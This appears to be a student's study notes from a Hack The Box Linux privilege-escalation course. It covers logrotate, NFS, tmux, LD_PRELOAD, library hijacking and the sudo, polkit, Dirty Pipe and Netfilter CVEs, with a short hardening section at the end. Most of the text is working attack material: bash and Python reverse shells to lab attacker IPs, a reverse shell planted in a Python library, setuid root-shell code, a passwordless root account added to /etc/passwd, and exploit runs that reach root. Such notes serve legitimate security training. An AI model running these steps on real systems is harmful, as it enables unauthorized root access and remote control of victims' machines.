nc -nlvp 9001

logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log

# id

uid=0(root) gid=0(root) groups=0(root)

## Questions
Escalate the privileges and submit the contents of flag.txt as the answer.
- Follow the sections accoordingly (ref to ## Overview) and make adjustment on exploitation process (adding a privileged uer to /etc/passwd)
find / -type f -name "logrotate.conf" 2>/dev/null
-> /snap/lxd/24918/etc/logrotate.conf
/snap/lxd/23889/etc/logrotate.conf

cat /snap/lxd/24918/etc/logrotate.conf
cat /snap/lxd/23889/etc/logrotate.conf
-> logrotate uses compress

git clone https://github.com/whotwagner/logrotten.git
cd logrotten

python -m http.server
wget http://10.10.16.28:8000/logrotten.c
wget http://10.10.16.28:8000/pwnme.log

gcc logrotten.c -o logrotten
mv pwnme.log /tmp/tmp.log

echo 'bash -i >& /dev/tcp/10.10.16.28/9001 0>&1' > payload

nc -nlvp 9001

chmod +x logrotten
chmod +x payload


echo testing > ~/backups/access.log

./logrotten -p ./payload -c -s 4 /tmp/tmp.log

./logrotten -p ./payload ~/backups/access.log
./logrotten -p ./payload -c -s 4 ~/backups/access.log

- reverse shell for persisitnece
- edit passwd files.


echo "test" > test.log

./logrotten -p ./payload ~/test.log

## How it rotates, based on file size?

cp access.log.1 access.log

cat /flag.txt

// Race condition abuse (slightly faster than...)
cat

## setting special bits
echo "/bin/bash -c 'su htb-student; chmod g+s /etc/passwd'" > payload
cat /etc/passwd | head -n 1
	-> Won't work or else need specific user?


./logrotten -p ./payload ~/backups/access.log

cp access.log.1 access.log


ls -ldb /etc/passwd

ls -l /etc/bash_completion.d

ls -ldb /etc/shadow

sudo vim /etc/passwd

echo "/bin/bash -c 'echo userabcd::0:0:root:/root:/bin/bash >> /etc/passwd'" > payload

userabcd:x:0:0:root:/root:/bin/bash
-> adding user worked

cat /etc/passwd | tail -n 1
su userabcd
-> root

playing around
echo "/bin/bash -c 'echo hello world >> /home/htb-student/backups/randomtextfile'" > payload


./logrotten -p ./payload /home/htb-student/backups/access.log
cp access.log.1 access.log
```

#### Miscellaneous Techniques
```
## Passive Traffic Capture
- If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. 
	
	-> Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. 
	
	-> This may result in capturing sensitive information such as credit card numbers and SNMP community strings. 
	
	-> It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. 
	
	-> Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

- Use of tcpdump to capture traffic, tools like netcreds, PCredz to examine data being passed on the wire. 

## Weak NFS Privileges
- Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems.
- 
	-> NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

showmount -e 10.129.2.12

cat /etc/exports

htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

htb@NIX02:/tmp$ gcc shell.c -o shell

root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt

htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>

htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root)...

## Hijacking Tmux Sessions
- Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. 
 
	-> When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). 
	
	-> For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. 
	
	-> This may be done with the following commands to create a new shared session and modify the ownership.
	
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
(-S socket path -s session name)

htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

id

tmux -S /shareds

## Questions
Review the NFS server's export list and find a directory holding a flag.
- Follow exactly as in the section (## Weak NFS privilege) to see multiple directory that can be mounted, with the /var/nfs/general being the one we can mount.

root@NIX02:/var/nfs/general# cat exports_flag.txt
cat exports_flag.txt
```

## Linux Internals-based Privilege Escalation
#### Kernel Exploits
```
## Overview
- Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). 
 
	-> These leverage vulnerabilities in the kernel to execute code with root privileges.
	
	 -> It is very common to find systems that are vulnerable to kernel exploits. 
	 
	 -> It can be hard to keep track of legacy systems, and they may be excluded from patching due to compatibility issues with certain services or applications.

Note: Kernel exploits can cause system instability so use caution when running these against a production system.

## Kernel Exploit Example
- Let's start by checking the Kernel level and Linux OS version.

areaeric@htb[/htb]$ uname -a

areaeric@htb[/htb]$ cat /etc/lsb-release 

areaeric@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit

areaeric@htb[/htb]$ ./kernel_exploit 

root@htb[/htb]# whoami

## Questions
Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.

- Followed the steps outlined in the section

uname -a
-> Linux NIX02 4.15.0-76-generic 

cat /etc/lsb-release 
-> 
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.6 LTS"
-> satisfy exploitation criteria for CVE-2021â€“4034
	-> searched on the website they used:

wget http://10.10.16.13:8000/ubuntu_18.04_exploit.c

gcc -c ubuntu_18.04_exploit.c -o ubuntu_exploit_18.04 && chmod +x ubuntu_exploit

use of :
https://github.com/JlSakuya/Linux-Privilege-Escalation-Exploits
-> ubuntu 18.04 LTS version instead.
-> The version of the OS is also important, not just the kernel version.

wget http://10.10.16.13:8000/ubuntu_18.04_exploit.c

gcc -c ubuntu_18.04_exploit.c -o ubuntu_exploit_18.04 && chmod +x ubuntu_exploit_18.04
./ubuntu_exploit_18.04

gcc ubuntu_18.04_exploit.c -o exploit
-> worked, need to follow the usage instructions. 

cat /root/kernel_exploit/flag.txt
```



## Shared Libraries
```shell-session
## Overview

- It is common for Linux programs to use dynamically linked shared object libraries.
 
	-> Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs.
	
	-> Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). 
	
	-> When a program is compiled, static libraries become part of the program and can not be altered. 
	
	-> However, dynamic libraries can be modified to control the execution of the program that calls them.

ldd /bin/ls

## LD_PRELOAD Privilege Escalation
- Let's see an example of how we can utilize the [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. 
 
	-> For this, we need a user with `sudo` privileges.
sudo -l

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

- Let's compile the following library
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

gcc -fPIC -shared -o root.so root.c -nostartfiles

htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)

## Quetions
Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.

- Follow the sections on ## LD_PRELOAD Privilege Escalation
sudo -l

- Write the root.c file

gcc -fPIC -shared -o root.so root.c -nostartfiles

sudo LD_PRELOAD=~/root.so /usr/bin/openssl 

cat /root/ld_preload/flag.txt
```

## Shared Object Hijacking
```shell-session
## Overview
Programs and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.

htb_student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll

ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

readelf -d payroll  | grep PATH
	
 0x000000000000001d (RUNPATH)            Library runpath: [/development]

ls -la /development/


ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

gcc src.c -fPIC -shared -o /development/libshared.so

htb_student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)

## Questions
- Follow the steps given in this section
	-> Edit src.c


#include<stdio.h>
#include<stdlib.h>
#include <gnu/libc-version.h>

void dbquery() {
    printf("Malicious library loaded\n");
    printf("GNU libc version: %s\n", gnu_get_libc_version());
    setuid(0);
    system("/bin/sh -p");
} 

gcc src.c -fPIC -shared -o /development/libshared.so

./payroll 
```

#### Python Library Hijacking
```shell-session
## Overview
- Python is one of the world's most popular and widely used programming languages and has already replaced many other programming languages in the IT industry. 

	-> There are very many reasons why Python is so popular among programmers. 
	
	-> One of them is that users can work with a vast collection of libraries.

## Wrong Write permissions
- For example, we can imagine that we are in a developer's host on the company's intranet and that the developer is working with python. 
 
	-> So we have a total of three components that are connected. 
	
	-> This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.

- Python Script
ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

- Python Script - Contents
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")

htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...

htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%

## Library Path
- In Python, each version has a specified order in which libraries (`modules`) are searched and imported from. 
 
	-> The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.
	
	-> We can see this by issuing the following command:
- PYTHONPATH Listing
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...

htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 

## PYTHONPATH Environment Variable
- In the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. 
 
	-> `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. 
	
	-> This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. 
	
	-> We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:

- Checking sudo permissions
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...

## Questions
Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.
- Follow the examples given in the sections.
	-> An example on ## wrong write permission is given here:
	
sudo -l 
 -> (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
 
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-> can write
Insert reverse shell (from attacking splunk section)

```python
import sys,socket,os,pty

os.system('id')
ip="10.10.16.13"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

vim /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

sudo nc -lvnp 443

sudo /usr/bin/python3 /home/htb-student/mem_status.py


find / -type f -name "flag.txt" 2>/dev/null
/root/flag.txt

cat /root/flag.txt

Note: Maybe same directory trick work here as well (library in .py), as it did work in this exercise.
```

## Recent 0 days
#### Sudo
```shell-session
## Overview
- The program `sudo` is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. 
 
	-> In most cases, commands are executed that are only available to administrators. 
	
	-> It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users.
	
	-> The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.
 
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d

sudo -V | head -n1

cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)

## Sudo Policy Bypass
- Another vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. 
 
	-> This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. 
	
	-> It had to allow a user in the `/etc/sudoers` file to execute a specific command.

cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id

cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash

cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)

## Questions
Escalate the privileges and submit the contents of flag.txt as the answer.
- Follow the section (## Overview for enumeration and ## Sudo Policy bypass for exploitation)
sudo -V | head -n1
-> Sudo version 1.8.21p2, vulnerable
sudo -u#-1 /bin/ncdu
```

#### Polkit
```shell-session
## Overview
- PolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. 
 
	-> To check whether the user software is authorized for this instruction, `polkit` is asked. 
	
	-> It is possible to set how permissions are granted by default for each user and application.
	
	-> For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required. 
	
	-> For individual users and groups, the authorizations can be assigned individually.

- Polkit works with two groups of files.

	1. actions/policies (`/usr/share/polkit-1/actions`)
	2. rules (`/usr/share/polkit-1/rules.d`)

- Polkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. 
 
	-> Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.

- PolKit also comes with three additional programs:

	- `pkexec` - runs a program with the rights of another user or with root rights
	- `pkaction` - can be used to display actions
	- `pkcheck` - this can be used to check if a process is authorized for a specific action

- The most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.
- 
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)

cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc

cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)

## Questions
Escalate the privileges and submit the contents of flag.txt as the answer.
- Follow sections (ref to ## Overview )

pkexec -u root id
-> confirmed existence of polykit

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
python -m http.server

wget http://10.10.16.13:8000/cve-2021-4034-poc.c
gcc cve-2021-4034-poc.c -o poc
chmod +x poc
./poc

find / -type f -name "flag.txt" 2>/dev/null
cat /root/flag.txt
```

#### Dirty Pipe
```shell-session
## Overview
- A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. 
 
	-> Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016.
	
	-> All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

- Download Dirty Pipe Exploit 
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh

cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic

cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)

cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp

cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3

## Questions
Escalate the privileges and submit the contents of flag.txt as the answer.
- Follow the sections (ref to ## Overview)
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
python -m http.server


wget http://10.10.16.13:8000/compile.sh
wget http://10.10.16.13:8000/exploit-1.c
wget http://10.10.16.13:8000/exploit-2.c
bash compile.sh
chmod +x exploit-1 exploit-2
./exploit-1

find / -type f -name "flag.txt" 2>/dev/null
cat /root/flag.txt

- other exploit using suid

./exploit-2 /usr/bin/umount
```

#### Netfilter
```shell-session

## Overview
- `Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. 
 
	-> `Netfilter` is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters.
	
	 -> These modules can then intercept and manipulate packets. This includes the programs like `iptables` and `arptables`, which serve as action mechanisms of the `Netfilter` hook system of the IPv4 and IPv6 protocol stack.

- This kernel module has three main functions:

	1. Packet defragmentation
	2. Connection tracking
	3. Network address translation (NAT)

- When the module is activated, all IP packets are checked by the `Netfilter` before they are forwarded to the target application of the own or remote system. 
 
	-> In 2021 ([CVE-2021-22555](https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555)), 2022 ([CVE-2022-1015](https://github.com/pqlx/CVE-2022-1015)), and also in 2023 ([CVE-2023-32233](https://github.com/Liuk3r/CVE-2023-32233)), several vulnerabilities were found that could lead to privilege escalation.

- CVE-2021-22555
uname -r

cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit
cry0l1t3@ubuntu:~$ ./exploit

- CVE-2022-25636
uname -r

cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[+] child  net_device ptr: 0xffff99128e5a9000

[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr and free net_device
[+] net_device struct freed

[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[+] obtained net_device struct

[*] STEP 4: Leak kaslr
[*] kaslr leak: 0xffffffff823093c0
[*] kaslr base: 0xffffffff80ffefa0

[*] STEP 5: Release setxattrs, free net_device, and realloc it again
[+] obtained net_device struct

[*] STEP 6: rop :)

# id

uid=0(root) gid=0(root) groups=0(root)


- CVE-2023-32233
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl

cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit

[*] Netfilter UAF exploit

Using profile:
========
1                   race_set_slab                   # {0,1}
1572                race_set_elem_count             # k
4000                initial_sleep                   # ms
100                 race_lead_sleep                 # ms
600                 race_lag_sleep                  # ms
100                 reuse_sleep                     # ms
39d240              free_percpu                     # hex
2a8b900             modprobe_path                   # hex
23700               nft_counter_destroy             # hex
347a0               nft_counter_ops                 # hex
a                   nft_counter_destroy_call_offset # hex
ffffffff            nft_counter_destroy_call_mask   # hex
e8e58948            nft_counter_destroy_call_check  # hex
========

[*] Checking for available CPUs...
[*] sched_getaffinity() => 0 2
[*] Reserved CPU 0 for PWN Worker
[*] Started cpu_spinning_loop() on CPU 1
[*] Started cpu_spinning_loop() on CPU 2
[*] Started cpu_spinning_loop() on CPU 3
[*] Creating "/tmp/modprobe"...
[*] Creating "/tmp/trigger"...
[*] Updating setgroups...
[*] Updating uid_map...
[*] Updating gid_map...
[*] Signaling PWN Worker...
[*] Waiting for PWN Worker...

...SNIP...

[*] You've Got ROOT:-)

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Hardening Consideration
#### Linux Hardening
```
## Overview
- Proper Linux hardening can eliminate most, if not all, opportunities for local privilege escalation.
	
	-> The following steps should be taken, at a minimum, to reduce the risk of an attack being able to elevate to root-level access

## Updates and Patching
- Many quick and easy privilege escalation exploits exist for out-of-date Linux kernels and known vulnerable versions of built-in and third-party services.
 
	-> Performing periodic updates will remove some of the most "low hanging fruit" that can be leveraged to escalate privileges. 
	
	-> On Ubuntu, the package [unattended-upgrades](https://packages.ubuntu.com/jammy/admin/unattended-upgrades) is installed by default from 18.04 onwards and can be manually installed on Ubuntu dating back to at least 10.04 (Lucid). 
	
	-> Debian based operating systems going back to before Jessie also have this package available. 
	
	-> On Red Hat based systems, the [yum-cron](https://man7.org/linux/man-pages/man8/yum-cron.8.html) package performs a similar task.

## Configuration Management

- This is by no means an exhaustive list, but some simple hardening measures are to:

	- Audit writable files and directories and any binaries set with the SUID bit.
	- Ensure that any cron jobs and sudo privileges specify any binaries using the absolute path.
	- Do not store credentials in cleartext in world-readable files.
	- Clean up home directories and bash history.
	- Ensure that low-privileged users cannot modify any custom libraries called by programs.
	- Remove any unnecessary packages and services that potentially increase the attack surface.
	- Consider implementing [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux), which provides additional access controls on the system.

## User Management

- We should limit the number of user accounts and admin accounts on each system, ensure that logon attempts (valid/invalid) are logged and monitored. 
- 
	-> It is also a good idea to enforce a strong password policy, rotate passwords periodically, and restrict users from reusing old passwords by using the /etc/security/opasswd file with the PAM module.
	
	-> We should check that users are not placed into groups that give them excessive rights not needed for their day-to-day tasks and limit sudo rights based on the principle of least privilege.

- Templates exist for configuration management automation tools such as [Puppet](https://puppet.com/use-cases/configuration-management/), [SaltStack](https://github.com/saltstack/salt), [Zabbix](https://en.wikipedia.org/wiki/Zabbix) and [Nagios](https://en.wikipedia.org/wiki/Nagios) to automate such checks and can be used to push messages to a Slack channel or email box as well as via other methods. 
- 
	-> Remote actions (Zabbix) and Remediation Actions (Nagios) can be used to find and auto correct these issues over a fleet of nodes.
	
	-> Tools such as Zabbix also feature functions such as checksum verification, which can be used for both version control and to confirm sensitive binaries have not been tampered with.
	 
	-> For example, via the [vfs.file.cksum](https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix_agent) file.

## Audit

- Perform periodic security and configuration checks of all systems. 
- 
	-> There are several security baselines such as the DISA [Security Technical Implementation Guides (STIGs)](https://public.cyber.mil/stigs/) that can be followed to set a standard for security across all operating system types and devices. 
	
	-> Many compliance frameworks exist, such as [ISO27001](https://www.iso.org/isoiec-27001-information-security.html), [PCI-DSS](https://www.pcisecuritystandards.org/pci_security/), and [HIPAA](https://www.hhs.gov/hipaa/for-professionals/security/index.html) which can be used by an organization to help establish security baselines. 
	
	-> These should all be used as reference guides and not the basis for a security program. 
	
	-> A strong security program should have controls tailored to the organization's needs, operating environment, and the types of data that they store and process (i.e., personal health information, financial data, trade secrets, or publicly available information).

- An audit and configuration review is not a replacement for a penetration test or other types of technical, hands-on assessments and is often seen as a "box-checking" exercise in which an organization is "passed" on a controls audit for performing the bare minimum. 
 
	-> These reviews can help supplement regular vulnerability scanning and penetration testing and strong patch, vulnerability, and configuration management programs.

- One useful tool for auditing Unix-based systems (Linux, macOS, BDS, etc.) is [Lynis](https://github.com/CISOfy/lynis). 
- 
	-> This tool audits the current configuration of a system and provides additional hardening tips, taking into consideration various standards. 
	
